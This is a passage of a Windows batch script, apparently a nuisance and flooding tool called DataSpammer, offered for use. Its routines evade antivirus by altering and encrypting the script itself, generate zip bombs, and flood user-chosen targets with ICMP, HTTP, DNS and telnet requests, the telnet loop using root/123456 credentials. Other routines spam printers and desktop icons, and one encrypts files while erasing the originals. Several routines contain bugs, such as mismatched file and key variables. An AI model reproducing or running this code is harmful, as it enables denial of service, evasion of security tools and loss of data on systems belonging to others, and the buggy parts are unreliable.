        if %_erl%==3 goto advanced.options
        if %_erl%==4 call :standby
    goto verbose.output.settings

:verbose.enable
    call :update_config "verbose" "" "1"
    echo Verbose Output Enabled.
    call :sys.lt 2
    goto verbose.output.settings

:verbose.disable
    call :update_config "verbose" "" "0"
    echo Verbose Output Disabled.
    call :sys.lt 2
    goto verbose.output.settings

:custom.instruction.enable
    set "ftypedir=%~0"
    :: Connect .dts with dtsfile type
    ASSOC .dts=dtsfile
    :: Connect dtsfily type with cmd
    FTYPE dtsfile=cmd.exe /c "\"%ftypedir%\" \"%%1\""
    echo Enabled Custom Instructions
    

:download.wait
    :: Download Wait.exe and Wait.exe Hash
    echo Downloading wait.exe
    bitsadmin /transfer upd "https://github.com/PIRANY1/wait-exe/raw/refs/heads/main/bin/wait.exe" "%temp%\wait.exe" >nul
    if errorlevel 1 (
        %errormsg%
        echo Download failed. 
        exit /b 1
    )   
    echo Downloading Hash...
    bitsadmin /transfer upd "https://github.com/PIRANY1/wait-exe/raw/refs/heads/main/bin/wait.exe.sha256" "%temp%\wait.exe.sha256" >nul
    if errorlevel 1 (
        %errormsg%
        echo Download failed. 
        exit /b 1
    )  
    :: Extract Hashes
    certutil -hashfile "%temp%\wait.exe" SHA256 > "%temp%\wait.hash"
    for /f "delims=" %%a in ('%powershell_short% -Command "(Get-Content '%temp%\wait.exe.sha256' | Select-String -Pattern '([0-9a-fA-F]{64})').Matches.Groups[1].Value"') do set "sha256_expected=%%a"
    for /f "delims=" %%a in ('%powershell_short% -Command "(Get-Content '%temp%\wait.hash' | Select-String -Pattern '([0-9a-fA-F]{64})').Matches.Groups[1].Value"') do set "sha256_actual=%%a"

    :: Compare Hashes
    if "%sha256_expected%" neq "%sha256_actual%" (
        %errormsg%
        echo Hash mismatch! Expected: %sha256_expected%, but got: %sha256_actual%
        echo Download Failed.
        goto menu
    )
    del "%temp%\wait.hash"
    del "%temp%\wait.exe.sha256"
        
    :: Move Wait.exe    
    move /Y "%temp%\wait.exe" "%~dp0\wait.exe" 
    if errorlevel 1 (
        %errormsg%
        echo Failed to move wait.exe. 
        exit /b 1
    )
    call :color _Green "wait.exe installed successfully." okay
    echo Restarting...
    goto restart.script

:change.chcp
    :: Change Codepage to allow for different character sets
    for /f "tokens=2 delims=:" %%A in ('chcp') do (
        set "chcp.value=%%A"
    )
    set "chcp.value=!chcp.value: =!"
    set "chcp.clean=!chcp.value:.=!"


    echo Current Codepage: !chcp.clean!
    echo:
    echo CHCP Values:
    echo 437	United States
    echo 850	Multilingual (Latin I)
    echo 852	Slavic (Latin II)	 
    echo 855	Cyrillic (Russian)	 
    echo 857	Turkish	 
    echo 860	Portuguese	 
    echo 861	Icelandic	 
    echo 863	Canadian-French	 
    echo 865	Nordic	 
    echo 866	Russian	 
    echo 869	Modern Greek	 
    echo 1252	West European Latin	 
    echo 65000	UTF-7 *	 
    echo 65001	UTF-8 * (Enabling this will enable Emojis Too)
    set /p chcp.var=Please enter the Codepage:
    call :update_config "chcp" "" "%chcp.var%" 
    goto restart.script

:change.color
    :: Set Color Dialog
    echo:
    echo Currently Using Color: %color%
    echo:
    echo Color 02 = Black Background ^& Green Text
    echo 0 = Black       8 = Gray
    echo 1 = Blue        9 = Light Blue
    echo 2 = Green       A = Light Green
    echo 3 = Cyan        B = Light Cyan
    echo 4 = Red         C = Light Red
    echo 5 = Purple      D = Light Purple
    echo 6 = Yellow      E = Light Yellow
    echo 7 = Light Gray  F = White
    echo:
    set /p color.var=Please enter the Color Combination:
    call :update_config "color" "" "%color.var%"


:monitor.settings
    if "%monitoring%"=="1" set "monitoring-status=Enabled"
    if "%monitoring%"=="0" set "monitoring-status=Disabled"
    echo -----------------------
    echo Monitor Socket Settings
    echo -----------------------

    echo:
    echo Monitoring is currently %monitoring-status%
    echo:
    echo [1] Enable Monitor Socket
    call :sys.lt 1
    echo [2] Disable Monitor Socket
    call :sys.lt 1
    echo [3] Go back
    echo:
    choice /C 123S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto monitor.enable
        if %_erl%==2 goto monitor.disable
        if %_erl%==3 goto advanced.options
        if %_erl%==4 call :standby
    goto monitor.settings

:monitor.enable
    call :update_config "monitoring" "" "1"
    echo Monitor Socket Enabled.
    call :sys.lt 2
    goto monitor.settings

:monitor.disable
    call :update_config "monitoring" "" "0"
    echo Monitor Socket Disabled.
    call :sys.lt 2
    goto monitor.settings

:login.setup
    %cls.debug%
    echo Logged in as %username.script%
    echo:
    echo [1] Create Account
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Change Login   
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Delete Login
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] Discard
    echo:
    echo:
    choice /C 1234S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto login.create
        if %_erl%==2 goto login.change
        if %_erl%==3 goto login.delete
        if %_erl%==4 goto settings
        if %_erl%==5 call :standby
    goto login.setup
    
:login.change
    :: Delete User Account, then create a new one
    echo Changing Login...
    reg delete "HKCU\Software\DataSpammer" /v UsernameHash /f
    reg delete "HKCU\Software\DataSpammer" /v PasswordHash /f
    goto login.create

:login.delete
    :: Delete User Account
    reg delete "HKCU\Software\DataSpammer" /v UsernameHash /f
    reg delete "HKCU\Software\DataSpammer" /v PasswordHash /f
    echo Account deleted successfully.
    echo Restarting Script...
    call :sys.lt 1
    goto restart.script

:login.create
    :: Create new Login Hashes
    for /f "tokens=3" %%A in ('reg query "HKCU\Software\DataSpammer" /v UsernameHash 2^>nul') do set "storedhash=%%A"
    if defined storedhash echo Account already exists. && call :sys.lt 4 && goto login.setup

    :: Input Password & Username
    set /p "username.script=Please enter a Username: "
    set "username.script=%username.script: =%"

    for /f "delims=" %%a in ('%powershell_short% -Command "$pass = Read-Host 'Please enter your Password' -AsSecureString; [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))"') do set "password=%%a"

    echo Hashing the Username and Password...
    set "pscmd= $input = '%username.script%'; $bytes = [System.Text.Encoding]::UTF8.GetBytes($input); $sha = [System.Security.Cryptography.SHA256]::Create(); $hash = $sha.ComputeHash($bytes); ($hash | ForEach-Object { $_.ToString('x2') }) -join ''"
    for /f "usebackq delims=" %%a in (`%powershell_short% -Command "%pscmd%"`) do set "username_hash=%%a"

    set "pscmd= $input = '%password%'; $bytes = [System.Text.Encoding]::UTF8.GetBytes($input); $sha = [System.Security.Cryptography.SHA256]::Create(); $hash = $sha.ComputeHash($bytes); ($hash | ForEach-Object { $_.ToString('x2') }) -join ''"
    for /f "usebackq delims=" %%a in (`%powershell_short% -Command "%pscmd%"`) do set "password_hash=%%a"

    :: Save the hashed values in a secure location>%destination%
    echo UsernameHash: %username_hash% >%destination%
    echo PasswordHash: %password_hash% >%destination%

    echo Saving Secure Data...
    reg add "HKCU\Software\DataSpammer" /v UsernameHash /t REG_SZ /d "%username_hash%" /f
    reg add "HKCU\Software\DataSpammer" /v PasswordHash /t REG_SZ /d "%password_hash%" /f
    %cls.debug%
    echo Account created successfully.
    call :sys.lt 1
    goto restart.script

:encrypt
    :: Encrypt Script Files, to bypass Antivirus
    if %logging% == 1 ( call :log Encrypting_Script WARN )
    echo Encrypting...
    call :sys.lt 1
    cd /d "%~dp0 "
    :: Version Update checks for this File
    call :generateRandom
    reg add "HKCU\Software\DataSpammer" /v Token /t REG_SZ /d "%realrandom%" /f

    (
        @echo off
        cd /d "%~dp0"
        echo FF FE 0D 0A 63 6C 73 0D 0A > temp_hex.txt
        certutil -f -decodehex temp_hex.txt temp_prefix.bin
        move dataspammer.bat original_dataspammer.bat
        copy /b temp_prefix.bin + original_dataspammer.bat dataspammer.bat
        erase original_dataspammer.bat
        erase temp_hex.txt
        erase temp_prefix.bin
        Cipher /E dataspammer.bat
        cd /d "%~dp0"
        start %powershell_short% -Command "Start-Process 'dataspammer.bat' -Verb runAs"
        erase encrypt.bat
    ) > encrypt.bat
     
    start %powershell_short% -Command "Start-Process 'encrypt.bat' -Verb runAs"
    goto cancel



:switch.elevation
    :: Switch Elevation Method
    echo Choose an Elevation method.
    echo: 
    echo Powershell is the default and recommended option.
    echo Sudo requires Windows 24H2 or higher and must be manually enabled.
    echo Gsudo is a third-party tool and must be installed manually.
    echo:
    echo [1] Powershell
    echo:
    echo [2] sudo (needs 24H2)
    echo:
    echo [3] gsudo (/gerardog/gsudo)
    echo:
    echo: 
    choice /C 123S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto switch.pwsh.elevation
        if %_erl%==2 goto switch.sudo.elevation
        if %_erl%==3 goto switch.gsudo.elevation
        if %_erl%==4 call :standby
    goto switch.elevation


:switch.sudo.elevation
    :: Switch to Sudo Elevation
    :: Powershell Elevation is more reliable
    :: Windows will support sudo, starting in 24H2
    :: Check for Windows Version 24H2 or higher > where SUDO > start via sudo

    :: https://github.com/microsoft/sudo
    :: https://github.com/microsoft/sudo/blob/main/scripts/sudo.ps1
    :: Query Registry for Windows Version
    for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId"') do set "release-id=%%a"
    for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "CurrentBuild"') do set "build=%%a"
    
    :: Version: %release-id%
    :: Build-Number: %build%
    set /a min_build=25900
    if not %build% geq %min_build% (
        :: is lower than 24H2
        echo You dont have Version 24H2 && pause && goto advanced.options
    )
    
    :: Check if Sudo is installed
    for /f "delims=" %%a in ('where sudo') do (
        set "where_output=%%a"
    )
    if not defined where_output (echo You dont have sudo enabled. && pause && goto advanced.options)

    :: Switch to Sudo
    if %logging% == 1 ( call :log Chaning_Elevation_to_sudo WARN )
    call :update_config "elevation" "" "sudo"
    echo Switched to Sudo.
    call :sys.lt 2
    goto restart.script


:switch.pwsh.elevation
    :: Switch to Powershell Elevation
    echo Switching to Powershell Elevation...
    call :sys.lt 2
    if %logging% == 1 ( call :log Chaning_Elevation_to_pwsh WARN )
    call :update_config "elevation" "" "pwsh"
    echo Switched to Powershell.
    call :sys.lt 2
    goto restart.script

:switch.gsudo.elevation
    :: Switch to GSudo Elevation
    echo Switching to GSUDO Elevation...
    call :sys.lt 2
    if %logging% == 1 ( call :log Chaning_Elevation_to_gsudo WARN )
    call :update_config "elevation" "" "gsudo"
    echo Switched to GSudo.
    call :sys.lt 2
    goto restart.script

:spam.settings
    echo [1] Default Filename
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo [2] Skip Security Question
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo [3] Go back
    choice /C 1234S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 (
            if %logging% == 1 ( call :log Chaning_Default_Filename WARN )
            :df.filename.input
            set /p default-filename=Type in the Filename you want to use:
            call :fd.check file %default-filename%
            if "%errorlevel%"=="1" goto df.filename.input
            call :update_config "default-filename" "" "%default-filename%" 
            goto restart.script
        )
        if %_erl%==2 goto settings.skip.sec
        if %_erl%==3 goto settings
        if %_erl%==4 call :standby
    goto spam.settings

:settings.skip.sec
    if %logging% == 1 (
        call :log Chaning_Skip_security_question WARN
    )
    set "settings.skip-sec=%skip-sec%"
    if "%settings.skip-sec%"=="1" (
        set "settings.skip-sec=0"
    ) else (
        set "settings.skip-sec=1"
    )
    call :update_config "skip-sec" "" "%settings.skip-sec%"
    if %logging% == 1 (
        call :log Skip_Security_Question_Updated_To_%settings.skip-sec% INFO
    )
    goto restart.script

:settings.version.control
    echo:
    echo:
    call :sys.lt 1
    echo [1] Force Update
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Switch to Main Branch
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Switch to Develop Branch (v6)
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] Go Back
    call :sys.lt 1
    echo:
    echo:
    choice /C 1234S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 call :update.script stable && goto cancel
        if %_erl%==2 call :update.script stable && goto cancel
        if %_erl%==3 call :update.script beta && goto cancel
        if %_erl%==4 goto settings
        if %_erl%==5 call :standby
    goto settings.version.control


:activate.dev.options   
    if %developermode% == 1 goto dev.options
    echo Do you want to activate the Developer Options?
    echo Developer Options include some advanced features like logging etc.
    echo These Features are experimental can be unstable.
    echo:
    choice /C YNS /T 120 /D S  /M "Yes/No"
        set _erl=%errorlevel%
        if %_erl%==1 goto write-dev-options
        if %_erl%==2 goto settings
        if %_erl%==3 call :standby
    goto activate.dev.options   
    
:write-dev-options
    if %logging% == 1 ( call :log Activating_Dev_Options WARN )
    cd /d "%~dp0"
    call :update_config "developermode" "" "1"
    echo Developer Options have been activated!
    echo Script will now restart
    call :sys.lt 2
    goto restart.script


:settings.logging
    if %logging% == 1 ( call :log Opened_Logging_Settings INFO )
    %cls.debug%
    if %logging% == 0 set "settings.logging=Disabled"
    if %logging% == 1 set "settings.logging=Enabled"
    if %logging% == 2 set "settings.logging=Enabled (Only Critical)"
    echo Logging is currently: %settings.logging%
    echo:
    call :sys.lt 1
    echo [1] Activate Logging
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Disable Logging
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Open Log
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] Clear Log
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [5] Go Back
    call :sys.lt 1
    echo:
    echo:
    choice /C 12345S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto enable.logging
        if %_erl%==2 goto disable.logging
        if %_erl%==3 %cls.debug% && echo Opening Log... & notepad %userprofile%\Documents\DataSpammerLog\DataSpammer.log && pause && goto settings.logging
        if %_erl%==4 %cls.debug% && erase %userprofile%\Documents\DataSpammerLog\DataSpammer.log && echo Log Cleared. && pause && goto settings.logging
        if %_erl%==5 goto settings
        if %_erl%==6 call :standby
    goto settings.logging


:enable.logging
    if %logging% == 1 ( goto settings.logging )
    echo Do you want to set Logging to Only ERRORs / WARNs or General?
    choice /C CG /M "(C)ritical / (G)eneral"
        if %_erl%==1 call :update_config "logging" "" "2"
        if %_erl%==2 call :update_config "logging" "" "1"
    echo Enabled Logging.
    call :sys.lt 2
    goto restart.script

:disable.logging
    if %logging% == 0 ( goto settings.logging )
    if %logging% == 1 ( call :log Disabling_Logging WARN )
    call :update_config "logging" "" "0"
    echo Disabled Logging.
    call :sys.lt 2
    goto restart.script

:desktop.settings
    %cls.debug%
    echo:
    echo =====================
    echo Desktop Icon Settings
    echo =====================
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Setup 
    echo:
    call :sys.lt 1
    echo [2] Back
    echo:

    choice /C 12S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto desktop.setup
        if %_erl%==2 goto desktop.remove
        if %_erl%==3 goto menu
        if %_erl%==4 call :standby
    goto desktop.settings

:desktop.icon.setup
    echo Adding Desktop Icon
    %cls.debug%
    %powershell_short% -Command ^
     $WshShell = New-Object -ComObject WScript.Shell; ^
     $Shortcut = $WshShell.CreateShortcut('%USERPROFILE%\Desktop\DataSpammer.lnk'); ^
     $Shortcut.TargetPath = '%~0'; ^
     $Shortcut.Save()
    echo Added Desktop Icon
    call :sys.lt 4
    goto menu


:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: ------------------------------------------------- Settings <_> Spams------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------



:start
    if %logging% == 1 ( call :log Opened_Start INFO )
    call :sys.verify.execution
    if %logging% == 1 ( call :log Start_Verified INFO )
    %cls.debug%

    for /f "delims=" %%a in ('where python') do (
        set "where_output=%%a"
    )
    if not defined where_output (set "python.line=echo:") else ( set "python.line=echo [4] Python Scripts (Experimental)" ) 

:start.verified
    %$Echo% "     ___        _   _
    %$Echo% "    / _ \ _ __ | |_(_) ___  _ __  ___ 
    %$Echo% "   | | | | '_ \| __| |/ _ \| '_ \/ __|
    %$Echo% "   | |_| | |_) | |_| | (_) | | | \__ \
    %$Echo% "    \___/| .__/ \__|_|\___/|_| |_|___/
    %$Echo% "         |_|

    echo [1] Local Machine
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Internet ( LAN / WAN)
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Go back
    call :sys.lt 1
    %python.line%
    call :sys.lt 1
    choice /C 1234S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto local.spams
        if %_erl%==2 goto internet.spams
        if %_erl%==3 goto menu
        if %_erl%==4 goto python.spams    
        if %_erl%==4 call :standby
    goto start.verified


:internet.spams
    echo [1] SSH Test (Key-Auth or No Password)
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] DNS Test
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] FTP Test
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] HTTP(S) Test
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [5] Printer Test
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [6] ICMP Test (ping)
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [7] Telnet
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [8] Printer List Test
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [9] Go Back
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo:
    choice /C 123456789S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto ssh.spam
        if %_erl%==2 goto dns.spam
        if %_erl%==3 goto ftp.spam
        if %_erl%==4 goto https.spam
        if %_erl%==5 goto printer.spam
        if %_erl%==6 goto icmp.spam
        if %_erl%==7 goto telnet.spam
        if %_erl%==8 goto printer.list.spam
        if %_erl%==9 goto start.verified
        if %_erl%==10 call :standby
    goto internet.spams




:python.spams
    echo [1] Zip Bomb Creator
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Go Back
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo:
    choice /C 12S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto python.zip.bomb
        if %_erl%==2 goto start.verified
        if %_erl%==3 call :standby
    goto python.spams

:python.zip.bomb
    cd "%~dp0"

    :python.zip.bomb.sub
    call :filename.check zipname "Filename (with .zip): "
    set /P MB=Filesize (in MB): 
    set /P COUNT=How many Files in the Base layer?:
    set /A BYTES=%MB% * 1024 * 1024
    
    (
        echo import zipfile
        echo nullbytes = b'\x00' * %BYTES%
        echo filename = "%zipname%"
        echo with zipfile.ZipFile(filename, "w", compression=zipfile.ZIP_DEFLATED^) as zipf:
        echo ^    for i in range(%COUNT%):
        echo ^        zipf.writestr(f"data_%%03d.bin" %% i, nullbytes)
    ) > "%~dp0\zip.py"

    python "%~dp0\zip.py"
    erase "%~dp0\zip.py"




:printer.list.spam
    set /P printer.name=Enter the Printer Name:
    set /P printer.model=Enter the Modell(can be anything):
    set /P printer.count=Enter the Printer Count:
    for /L %%i in (1,1,%printer.count%) do (
        set "count=%%i"
        RUNDLL32 printui.dll,PrintUIEntry /if /b "!printer.name!!count!" /f "%windir%\inf\ntprint.inf" /m "%printer.model%"
        echo Added Printer !printer.name!!count!
    )
    call :done "The Script has added the Printer %printer.name% with the Model %printer.model% and the Count %printer.count%"
    


:telnet.spam
    echo root > temp.txt
    echo 123456 >> temp.txt
    echo exit >> temp.txt

    set /P telnet.target=Enter the Target:
    set /P telnet.count=How many Requests should be made?: 

    for /L %%i in (1,1,%telnet.count%) do (
        telnet %telnet.target% 23 < input.txt
    )
    
    del temp.txt
    if %logging% == 1 ( call :log Finished_Telnet_Spam_on_%telnet.target% INFO )
    call :done "The Script Tested the Telnet Server %telnet.target% with %telnet.count% Requests"


    
:icmp.spam
    set /P icmp.target=Enter the Target:
    
    set /P icmp.rate=Enter the rate (milliseconds between requests):
    
    echo Press CTRL+C to stop
    call :sys.lt 3
    
    :icmp.loop
    ping %icmp.target% -n 1 -w %icmp.rate%
    if %logging% == 1 ( call :log Sending_ICMP_Request_to_%icmp.target% INFO )
    goto icmp.loop

    if %logging% == 1 ( call :log Finished_ICMP_Spam_on_%icmp.target% INFO )
    call :done "The Script Tested %icmp.target% with %icmp.rate% milliseconds interval"



:local.spams
    echo Choose the Method you want to use:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] .txt Spam in custom Directory
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Desktop Icon Spam
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Startmenu Spam
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] App-List Spam
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [5] Encrypt / Decrypt File/Directory
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [6] Go Back
    echo:
    echo:
    echo:
    choice /C 123456S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto normal.text.spam
        if %_erl%==2 goto desktop.icon.spam
        if %_erl%==3 goto startmenu.spam
        if %_erl%==4 goto app.list.spam
        if %_erl%==5 goto crypt.spam
        if %_erl%==6 goto start.verified
        if %_erl%==7 call :standby
    goto local.spams





:crypt.spam
    echo Original Files will be REMOVED
    echo Encrypt or Decrypt?
    choice /C ED /M "(E)ncrypt or (D)ecrypt):"
        set _erl=%errorlevel%
        if %_erl%==1 goto encrypt.spam
        if %_erl%==2 goto decrypt.spam
    goto crypt.spam

:encrypt.spam
    echo Folder or File?
    choice /C FD /M "(F)ile or (D)irectory):"
        set _erl=%errorlevel%
        if %_erl%==1 goto encrypt.spam.file
        if %_erl%==2 goto encrypt.spam.folder
    goto encrypt.spam

:decrypt.spam
    echo Folder or File?
    choice /C FD /M "(F)ile or (D)irectory):"
        set _erl=%errorlevel%
        if %_erl%==1 goto decrypt.spam.file
        if %_erl%==2 goto decrypt.spam.folder
    goto decrypt.spam 

:encrypt.spam.folder
    call :directory.input encrypt-dir "Enter the Directory: "
    echo Enter the Encryption Method
    choice /C AC /M "(A)ES or (C)hacha):"
        set _erl=%errorlevel%
        if %_erl%==1 set "crypt.method=aes-256-cbc"
        if %_erl%==2 set "crypt.method=chacha20"
    set /p encrypt-key=Enter the Encryption Key:
    set /p encrypt-key-2=Repeat the Encryption Key:

:encrypt.spam.folder.passwd
    set /p encrypt-key=Enter the Encryption Key:
    set /p encrypt-key-2=Repeat the Encryption Key:
    if not "%encrypt-key%"=="%encrypt-key-2%" goto encrypt.spam.folder.passwd


    echo Encrypting files in "%encrypt-dir%"...
    for %%f in ("%encrypt-dir%\*") do (
        if /I not "%%~xf"==".enc" (
            echo Encrypting file: %%f
            if "%crypt.method%"=="aes-256-cbc" (
                openssl enc -aes-256-cbc -salt -in "%%f" -out "%%f.enc" -pass pass:%encrypt-key% -iter 100000
            ) else (
                openssl enc -chacha20 -salt -in "%%f" -out "%%f.enc" -pass pass:%encrypt-key% -iter 100000
            )
            erase "%%f" >nul 2>&1
            echo File "%%f" encrypted to "%%f.enc".
        )
    )
    
    echo All files encrypted.
    
    echo Waiting 2 Seconds...
    call :sys.lt 4
    goto menu


:encrypt.spam.file
    set /p encrypt-dir=Enter the File Directory:
    echo Enter the Encryption Method
    choice /C AC /M "(A)ES or (C)hacha):"
        set _erl=%errorlevel%
        if %_erl%==1 set "crypt.method=aes-256-cbc"
        if %_erl%==2 set "crypt.method=chacha20"

:encrypt.spam.file.passwd
    set /p encrypt-key=Enter the Encryption Key:
    set /p encrypt-key-2=Repeat the Encryption Key:
    if not "%encrypt-key%"=="%encrypt-key-2%" goto encrypt.spam.file.passwd

    echo Encrypting file: %encrypt-dir%
    if "%crypt.method%"=="aes-256-cbc" (
        openssl enc -aes-256-cbc -salt -in "%encrypt-dir%" -out "%encrypt-dir%.enc" -pass pass:%encrypt-key%  -iter 100000
    ) else (
        openssl enc -chacha20 -salt -in "%encrypt-dir%" -out "%encrypt-dir%.enc" -pass pass:%encrypt-key% -iter 100000
    )
    erase "%encrypt-dir%" >nul 2>&1
    echo File "%encrypt-dir%" encrypted to "%encrypt-dir%.enc".
    echo Encrypted with %crypt.method%
    echo Waiting 2 Seconds...    
    call :sys.lt 4
    goto menu

:decrypt.spam.folder
    call :directory.input encrypt-dir "Enter the Directory: "
    set /p decrypt-key=Enter the Encryption Key:
    echo Enter the Encryption Method
    choice /C AC /M "(A)ES or (C)hacha):"
        set _erl=%errorlevel%
        if %_erl%==1 set "crypt.method=aes-256-cbc"
        if %_erl%==2 set "crypt.method=chacha20"

    echo Decrypting files in "%encrypt-dir%"...
    for %%f in ("%encrypt-dir%\*.enc") do (
        echo Decrypting file: %%f
    
        if "%crypt.method%"=="aes-256-cbc" (
            openssl enc -d -aes-256-cbc -salt -in "%%f" -out "%%f.dec" -pass pass:%encrypt-key% -iter 100000
        ) else (
            openssl enc -d -chacha20 -in "%%f" -out "%%f.dec" -pass pass:%encrypt-key% -iter 100000
        )
    
        echo File "%%f" decrypted to "%%f.dec".
    )
    
    echo All files decrypted.

    echo Waiting 2 Seconds...
    call :sys.lt 4
    goto menu


:decrypt.spam.file
    set /p decrypt-dir=Enter the File Directory:
    set /p decrypt-key=Enter the Encryption Key:
    echo Enter the Encryption Method
    choice /C AC /M "(A)ES or (C)hacha):"
        set _erl=%errorlevel%
        if %_erl%==1 set "crypt.method=aes-256-cbc"
        if %_erl%==2 set "crypt.method=chacha20"

    echo Decrypting file: %encrypt-dir%
    
    if "%crypt.method%"=="aes-256-cbc" (
        openssl enc -d -aes-256-cbc -salt -in "%encrypt-dir%" -out "%encrypt-dir%.dec" -pass pass:%encrypt-key% -iter 100000
    ) else (
        openssl enc -d -chacha20 -in "%encrypt-dir%" -out "%encrypt-dir%.dec" -pass pass:%encrypt-key% -iter 100000
    )
    
    echo File "%encrypt-dir%" decrypted to "%encrypt-dir%.dec".  
    echo Waiting 2 Seconds...    
    call :sys.lt 4c
    goto menu
   



:printer.spam
    :: print /D:%printer% %file%
    :: set printer="\\NetworkPrinter\PrinterName"
    set /P printer.count=How many Files should be printed?: 
    call :filename.check print.filename "Enter the Filename:"

    %cls.debug%
    wmic printer get Name
    set /P printer-device=Choose a Device (full name):

    set /P printer.content=Enter the Content:
    cd /d "%~dp0"
    >> "%~dp0\%print.filename%.txt" echo %printer.content%

    for /L %%i in (1,1,%printer.count%) do (
        print %print.filename%.txt
        print /D:"%printer-device%" %print.filename%.txt
    )
    if %logging% == 1 ( call :log Finished_Printer_Spam:%printer.count%_Requests_on_default_Printer INFO )
    erase %print.filename%.txt
    call :done "The Script made %printer.count% Print-Jobs to Default Printer"



:https.spam
    setlocal EnableDelayedExpansion
    echo Spam a HTTP/HTTPS Server with Requests
    set /P url=Enter a Domain or an IP:
    set /P requests=How many requests should be made?: 

    for /L %%i in (1,1,%requests%) do (
        echo Sending Request %%i of %requests% to %url%
        curl -s -o NUL -w "Status: %{http_code}\n" !url!
    )

    if %logging% == 1 ( call :log Finished_HTTPS_Spam:%requests%_Requests_on_%url% INFO )
    call :done "The Script Created %requests% to %url%"



:dns.spam
    setlocal EnableDelayedExpansion    
    echo DNS-Spam is useful if you have a local DNS Server running (PiHole, Adguard etc.)
    set /P domain_server=Enter the DNS-Server IP (leave empty for default):
    set /P domain=Enter the Domain:
    set /P request_count=Enter the Request Count?:

    if not defined domain_server set "domain_server= "
    %cls.debug%
    echo Now enter the Record type. A for IPv4 and AAAA for IPv6. Use A if unsure.
    set /P record_type=Enter the DNS Record Type (A or AAAA):
    
    set /a x=0
    
    if /I "%record_type%"=="A" goto dns.a
    if /I "%record_type%"=="AAAA" goto dns.aaaa
    
    
:dns.a
    for /L %%i in (1, 1, %request_count%) do (
        echo Created !x! DNS Request for !record_type! record.
        set /a x+=1
        nslookup -type=A %domain% %domain_server% > nul
        %cls.debug%
    )
    goto dns.done
    
:dns.aaaa
    for /L %%i in (1, 1, %request_count%) do (
        echo Created !x! DNS Request for !record_type! record.
        set /a x+=1
        nslookup -type=AAAA %domain% %domain_server% > nul
        %cls.debug%
    )
    
:dns.done
    if %logging% == 1 ( call :log Finished_DNS_Spam:%request_count%_Requests_on_%domain_server% INFO )
    call :done "The Script Created %request_count% for %domain% on %domain_server%"




:ftp.spam
    %cls.debug%
    set /P ftpserver=Enter a Domain or IP:
    set /P username=Enter the Username:
    set /P password=Enter the Password:
    set /P remoteDir=Enter the Directory (leave empty if unsure):
    call :filename.check filename "Enter the Filename:"

    set /P content=Enter the File Content:
    set /P filecount=How many Files should be created:
    
    echo %content% > %filename%.txt
    
    :: Creates Files on local Machine
    echo Creating Files...
    set /a w=1
    cd /d "%temp%"
    for /l %%i in (1,1,%filecount%) do (
        >> "%temp%\%filename%%x%.txt" echo %content%
        set /a w+=1
    )

    
    :: Create FTP Command File 
    set ftpCommands=ftpcmd.txt
    echo open %ftpserver% > %ftpCommands%
    echo %username% >> %ftpCommands%
    echo %password% >> %ftpCommands%
    echo binary >> %ftpCommands%
    echo cd %remoteDir% >> %ftpCommands%
    
    :: Write Filenames in Command File
    setlocal EnableDelayedExpansion    
    set /a x=0
